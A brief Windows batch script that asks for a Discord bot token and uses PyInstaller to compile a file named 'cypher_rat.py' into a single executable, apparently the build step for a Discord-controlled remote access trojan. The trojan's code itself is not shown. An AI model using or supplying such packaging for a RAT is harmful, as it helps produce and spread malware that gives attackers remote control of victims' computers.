@echo off

set /p TOKEN=Enter your Discord bot token: 

rem Convert the Python script into an executable
pyinstaller --onefile cypher_rat.py

pause
